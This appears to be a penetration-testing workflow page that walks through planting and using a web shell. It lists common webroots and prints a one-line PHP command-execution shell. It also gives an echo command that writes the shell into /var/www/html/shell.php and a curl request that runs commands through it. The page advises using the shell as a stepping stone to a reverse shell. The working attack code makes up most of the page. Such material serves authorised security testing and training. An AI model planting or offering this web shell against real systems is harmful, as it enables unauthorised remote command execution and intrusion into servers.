---
description: Step-by-step workflow for placing, testing, and using a web shell.
---

# WF-Web Shell

Use this page when you already have web-based code execution, file upload, or write access to the webroot.

### Quick loop

1. Find a writable path.
2. Place the web shell.
3. Test command execution.
4. Use it to run commands.
5. Treat it as a bridge.

{% stepper %}
{% step %}
### Find the execution path

Confirm where executable web content lives.

Common webroots:

* Apache on Linux — `/var/www/html`
* Nginx — `/usr/share/nginx/html`
* XAMPP — `/htdocs`

You need both write access and script execution.
{% endstep %}

{% step %}
### Place the web shell

Write a web shell into the webroot.

Example PHP shell:

```php
<?php system($_REQUEST["cmd"]); ?>
```

Example write path:

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```
{% endstep %}

{% step %}
### Test command execution

Access the web shell through the browser or with `curl`.

```bash
curl "http://<TARGET_HOST>/shell.php?cmd=id"
```

If the command runs, the page prints the output back to you.
{% endstep %}

{% step %}
### Use it to run commands

You can keep changing the command to get output.

Use it when:

* you gain file upload
* you have command injection or RCE in a web app
* you need a simple way to run commands through the web server
{% endstep %}

{% step %}
### Treat it as a bridge

Use the web shell as a bridge.

It is usually less interactive than a reverse shell.

It is often best used as a stepping stone to a reverse shell or a better shell.
{% endstep %}
{% endstepper %}

### Fast decision rules

* If the script does not run, verify that you wrote it to the active webroot.
* If the shell works, use it to move to a better shell.
* If the host reboots, check whether the web shell still exists.

### Useful references

* [Getting started](./)
* [WF-Web Enumeration](wf-web-enumeration/)
